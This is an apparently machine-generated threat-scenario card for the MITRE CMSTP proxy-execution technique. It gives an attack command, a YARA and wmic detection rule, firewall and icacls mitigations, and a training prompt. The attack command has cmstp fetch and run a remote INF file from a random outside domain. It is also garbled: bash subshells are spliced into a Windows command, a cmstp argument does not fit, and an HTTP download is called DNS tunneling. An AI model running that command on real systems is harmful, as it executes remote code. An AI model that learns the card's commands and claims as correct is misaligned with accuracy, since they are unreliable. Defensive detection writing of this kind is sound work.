---
type: campaign
scenario_id: 375
tactic: Defense Evasion
technique: "T1218.003: CMSTP"
technique_id: T1218.003
tags: [campaign, lotl, defense_evasion]
---

# Using cmstp to execute DNS tunneling INF file.

## Threat Description
Using cmstp to execute DNS tunneling INF file.

## Attack Command
```
cmstp /ni /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor cmstp HTTP: `wmic process where name='cmstp.exe' get commandline | findstr http`; YARA rule: `rule CmstpDnsTunnel { strings: $a = /cmstp.*http.*inf/ nocase; condition: $a }`.

## Mitigation
Restrict cmstp: `icacls %windir%\System32\cmstp.exe /deny Everyone:RX`; Block INF downloads: `netsh advfirewall firewall add rule name='Block cmstp' dir=out program='%windir%\System32\cmstp.exe' action=block`.

## AI Training Prompt
Train AI to detect cmstp-based DNS tunneling INF execution by analyzing HTTP downloads, cmstp command-line arguments, and DNS query patterns; suggest INF download restrictions.

## References
- MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
